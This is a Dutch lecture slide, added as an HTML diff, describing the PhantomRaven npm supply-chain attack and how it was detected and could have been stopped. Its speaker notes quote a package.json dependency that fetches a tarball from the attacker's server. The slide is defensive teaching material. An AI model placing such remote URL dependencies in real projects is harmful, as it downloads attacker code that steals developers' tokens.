@@ -1,0 +1,38 @@
+<section id="inc-phantomraven" data-transition="fade" style="background:#FFFFFF;color:#3C3B40;font-family:'Source Sans 3', Arial, sans-serif;padding:120px 128px 150px;display:flex;flex-direction:column;gap:28px">
+<div style="display:flex;flex-direction:column;gap:12px">
+<p style="font-size:24px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:#E60005">Incident · augustus–oktober 2025 · onzichtbare dependency</p>
+<h2 style="font-family:'League Gothic', 'Arial Narrow', sans-serif;font-size:80px;font-weight:400;line-height:1.05;letter-spacing:0;color:#232226">PhantomRaven: “0 dependencies”</h2>
+</div>
+<div style="display:grid;grid-template-columns:300px 1fr;gap:12px 16px">
+<p style="font-size:24px;font-weight:600;letter-spacing:2px;text-transform:uppercase;line-height:1.5;color:#E60005;border-top:1px solid #CFCFD1;padding:14px 0 0 0">Toegang</p>
+<p style="font-size:27px;line-height:1.33;border-top:1px solid #CFCFD1;padding:12px 0 0 0">Geen account gekaapt: de aanvaller publiceerde 126 eigen packages vanaf wegwerpaccounts, met namen die lijken op eslint- en babel-plugins of op namen die een AI zou voorstellen.</p>
+<p style="font-size:24px;font-weight:600;letter-spacing:2px;text-transform:uppercase;line-height:1.5;color:#E60005;border-top:1px solid #CFCFD1;padding:14px 0 0 0">Verspreiding</p>
+<p style="font-size:27px;line-height:1.33;border-top:1px solid #CFCFD1;padding:12px 0 0 0">In package.json staat een dependency met een URL in plaats van een versie. npm haalt die bij de installatie van de server van de aanvaller; npmjs.com en scanners tonen “0 dependencies”.</p>
+<p style="font-size:24px;font-weight:600;letter-spacing:2px;text-transform:uppercase;line-height:1.5;color:#E60005;border-top:1px solid #CFCFD1;padding:14px 0 0 0">Payload</p>
+<p style="font-size:27px;line-height:1.33;border-top:1px solid #CFCFD1;padding:12px 0 0 0">Het opgehaalde package heeft een preinstall-script dat tokens van npm, GitHub, GitLab, Jenkins en CircleCI steelt, en e-mailadressen uit .gitconfig en .npmrc.</p>
+<p style="font-size:24px;font-weight:600;letter-spacing:2px;text-transform:uppercase;line-height:1.5;color:#E60005;border-top:1px solid #CFCFD1;padding:14px 0 0 0">Detectie en respons</p>
+<p style="font-size:27px;line-height:1.33;border-top:1px solid #CFCFD1;padding:12px 0 0 0">Koi Security zag dat packages tijdens de installatie netwerkverkeer maakten, allemaal naar hetzelfde domein. Samen meer dan 86.000 downloads.</p>
+</div>
+<div style="display:flex;gap:24px;align-items:stretch">
+<div style="flex:1;background:#E6EFF3;border-left:6px solid #005078;border-radius:8px;padding:20px 32px">
+<p style="font-size:27px;line-height:1.35;color:#232226"><b><span style="color:#005078">Les.</span></b> “0 dependencies” op npmjs.com betekent niet dat er niets wordt opgehaald: kijk naar wat een package doet.</p>
+</div>
+<div style="width:440px;background:#F4F4F4;border:1px solid #E1E1E1;border-radius:8px;padding:20px 28px;display:flex;flex-direction:column;gap:6px;justify-content:center">
+<p style="font-size:20px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:#6B6A70">Had dit tegengehouden</p>
+<p style="font-size:26px;line-height:1.3;font-weight:600;color:#232226">install scripts blokkeren, een gedragsscanner</p>
+</div>
+</div>
+<p style="position:absolute;left:128px;bottom:64px;width:1440px;font-size:24px;color:#6B6A70">Deel 4 — Tijdlijn en casestudies · 0:18–0:30</p>
+<img src="/_blob/4d3eecb01832b6f4111235aa00bb3842" alt="AP Hogeschool" style="position:absolute;right:128px;bottom:52px;height:56px;width:auto">
+<aside>Verdieping: sla over bij tijdgebrek.
+
+Van augustus tot oktober 2025 publiceerde een aanvaller 126 packages vanaf een reeks wegwerpaccounts. De namen leken op korte namen van eslint- en babel-plugins (unused-imports, eslint-comments) of op interne namen van bedrijven. Koi Security, dat de campagne ontdekte, noemt het slopsquatting: namen die AI-assistenten verzinnen. Dat is deels zo; de echte vernieuwing zit in de techniek.
+
+Remote dynamic dependencies: npm aanvaardt een URL als dependency, bijvoorbeeld "ui-styles-pkg": "http://packages.storeartifact.com/npm/unused-imports". Het package op npmjs.com bevat alleen een “Hello, world!”-script en heeft volgens de website 0 dependencies. Pas bij npm install haalt npm de tweede tarball rechtstreeks van de server van de aanvaller, buiten de registry om. Die server kan per verzoek kiezen wat hij levert: schone code voor een onderzoeker, malware voor een bedrijf. Koi: “To every automated security system, these packages show ‘0 Dependencies.’”
+
+Het opgehaalde package heeft een preinstall-script dat e-mailadressen en CI-tokens steelt en ze via drie kanalen naar de aanvaller stuurt.
+
+Detectie: Koi zag in een sandbox dat packages tijdens de installatie netwerkverbindingen maakten. Zo werkt een gedragsscanner (laag 5). Install scripts blokkeren had de payload ook tegengehouden.
+
+Bronnen: Koi Security (via archive.org); BleepingComputer.</aside>
+</section>
